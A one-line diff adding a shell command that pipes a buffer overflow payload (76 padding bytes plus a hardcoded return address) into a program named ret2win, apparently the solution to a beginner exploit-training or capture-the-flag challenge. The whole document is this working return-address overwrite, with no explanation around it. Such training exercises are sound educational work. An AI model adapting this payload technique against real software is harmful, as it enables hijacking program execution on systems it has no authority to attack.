@@ -1,0 +1,1 @@
+python -c 'print "A"*76 + "\x86\x85\x04\x08"' | ./ret2win
